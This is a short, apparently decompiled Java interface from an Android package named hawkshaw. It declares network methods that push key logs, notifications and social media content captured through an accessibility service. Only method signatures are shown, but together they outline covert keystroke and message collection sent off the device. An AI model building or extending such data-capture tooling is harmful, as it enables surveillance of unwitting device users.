package com.hawkshaw.library.datalayer.network.service;

import a3.e;
import com.hawkshaw.library.datalayer.models.accessibility.PushKeyLogsRequest;
import com.hawkshaw.library.datalayer.models.accessibility.PushNotificationRequest;
import com.hawkshaw.library.datalayer.models.accessibility.PushSocialMediaRequest;
import com.hawkshaw.library.datalayer.models.accessibility.PushUnprocessedSocialMediaRequest;

public interface AccessibilityService {
    Object pushKeyLogs(PushKeyLogsRequest pushKeyLogsRequest, e eVar);

    Object pushNotifications(PushNotificationRequest pushNotificationRequest, e eVar);

    Object pushSocialMedia(PushSocialMediaRequest pushSocialMediaRequest, e eVar);

    Object pushUnprocessedSocialMedia(PushUnprocessedSocialMediaRequest pushUnprocessedSocialMediaRequest, e eVar);
}
